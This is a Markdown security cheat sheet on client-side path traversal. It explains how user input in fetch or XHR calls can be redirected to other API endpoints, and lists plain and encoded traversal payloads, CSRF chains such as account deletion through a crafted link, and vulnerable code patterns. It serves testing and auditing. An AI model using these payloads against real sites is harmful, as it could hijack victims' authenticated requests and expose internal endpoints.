# Client-Side Path Traversal (CSPT)

## Overview
Client-Side Path Traversal occurs when user-controlled input is used in client-side fetch/XHR calls, allowing attackers to redirect API calls to unintended endpoints — often chained to achieve CSRF or SSRF-like impacts.

## How CSPT Works
```
# Vulnerable JS:
const userId = getParam('id');
fetch(`/api/users/${userId}/profile`);

# Attacker supplies: id=../admin/settings
# → Fetch calls: /api/users/../admin/settings → /api/admin/settings

# Result: unauthorized API call made by victim's browser
# With victim's credentials/cookies
```

## Detection
```
# Look for JS code patterns:
fetch('/api/' + userInput)
axios.get('/endpoint/' + param)
$.get('/resource/' + value)
location.pathname used in API calls
window.location.hash used in fetch

# URL parameters reflected in API calls
# URL fragments used for routing then in API requests
```

## Path Traversal Payloads
```
# Basic traversal
../admin
../../config
../../../internal

# Encoded
%2e%2e%2f  → ../
%2e%2e/    → ../
..%2f      → ../
%2e%2e%2fadmin

# Double encoded
%252e%252e%252f

# URL fragment trick
/page#/../api/admin
```

## CSRF via CSPT
```
# If state-changing API can be reached via path traversal:
# 1. Find CSPT in GET parameter used in fetch
# 2. Target: DELETE /api/users/self
# 3. Craft URL: /dashboard?section=../../users/self
# 4. GET request → JS fetches /api/users/self
# 5. If CSRF token not required for this endpoint → CSRF achieved

# More powerful: CSPT + CSRF = account deletion/modification via link
```

## POST Body CSPT
```
# CSPT in JSON body field used as sub-path
POST /api/action
{"resource": "profile"}
→ Server calls /internal/profile

# Inject: {"resource": "../admin/reset-all"}
```

## Chaining with Other Vulnerabilities
```
# CSPT → SSRF (if server-side follows the client-side path)
# CSPT → XSS (if response is reflected back)
# CSPT → Info Disclosure (access internal API endpoints)
# CSPT → CSRF (trigger state-changing requests with victim credentials)
```

## Testing Methodology
1. Analyze all URL parameters, hash fragments, and form fields
2. Find JavaScript that uses these values in fetch/XHR/axios calls
3. Check if path traversal sequences pass to API endpoint
4. Map reachable endpoints via traversal
5. Identify state-changing endpoints reachable without CSRF token
6. Craft PoC URL that triggers action when victim visits
7. Test encoded variants if basic traversal is filtered

## Code Patterns to Audit
```javascript
// Vulnerable patterns
fetch(`/api${location.pathname}`)
fetch('/api/' + new URLSearchParams(location.search).get('path'))
axios.get('/service/' + route.params.id)

// Slightly safer (but still testable)
const path = sanitize(userInput);  // check if sanitize handles ../
fetch('/api/' + path);
```

## Impact
- CSRF-equivalent attacks with victim credentials
- Access to internal API endpoints
- Account takeover when chained with privileged API calls
- Data exfiltration from internal endpoints
